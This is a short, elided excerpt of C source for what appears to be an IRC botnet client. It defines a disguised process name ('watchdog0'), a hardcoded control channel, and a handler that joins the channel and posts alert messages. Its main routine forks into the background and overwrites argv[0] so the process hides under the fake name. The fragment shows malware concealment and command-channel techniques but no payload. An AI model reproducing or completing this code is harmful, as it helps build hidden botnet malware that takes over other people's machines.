...
#define FAKEPROC "watchdog0"	// pseudoprocess
#define CHAN "#symbiosllc"	// chan
...
void _376(int sock, char *sender, char *str) {
        Send(sock,"MODE %s -xi\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
	Send(sock,"PRIVMSG %s :\00303ALERT:\003\00300THISNETWORKSUCKS\003\r\n",chan);
	Send(sock,"PRIVMSG %s :\00303ALERT:\003\00300THISNETWORKSUCKS\003\r\n",chan);
...
int main(int argc, char **argv) {
        ...
        if (fork()) exit(0);
#ifdef FAKEPROC
	strncpy(argv[0],FAKEPROC,strlen(argv[0]));
